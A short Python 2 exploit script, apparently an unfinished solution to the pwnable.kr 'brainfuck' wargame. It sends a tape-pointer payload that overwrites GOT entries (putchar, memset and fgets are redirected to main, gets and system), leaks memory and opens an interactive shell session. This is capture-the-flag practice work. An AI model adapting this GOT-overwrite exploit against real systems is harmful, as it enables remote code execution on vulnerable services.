from socket import *
from time import sleep
import telnetlib

ip = "127.0.0.1"
port = 6000
ip = "pwnable.kr"
port = 9001

system_addr = 0x00;

pwn = socket(AF_INET, SOCK_STREAM)
pwn.connect((ip,port))
raw_input("wait")
sleep(2)
print pwn.recv(4096)
# putchar to main , memset to gets , fgets to system
pwn.send("<"*0x60 + "<"*0x10 + ".>.>.>.,<,<,<,<" + "<" + "-"*0xd + "<"  +"+"*0x25 + "<"+ "-"*0x60 +\
	 "<"*0x19 +"<"+"-"*2+"<"+"+"*0x97+"<"+"+"*0x90 +"."+ "\n")
sleep(1)
#pwn.send("\x08\x04\xA0\xA0")
pwn.send("\x08\x04\x86\x71") # main

sleep(1)
system_addr = pwn.recv(4096)
print':'.join(x.encode('hex') for x in system_addr ) 
print system_addr
t = telnetlib.Telnet()
t.sock = pwn
t.interact()
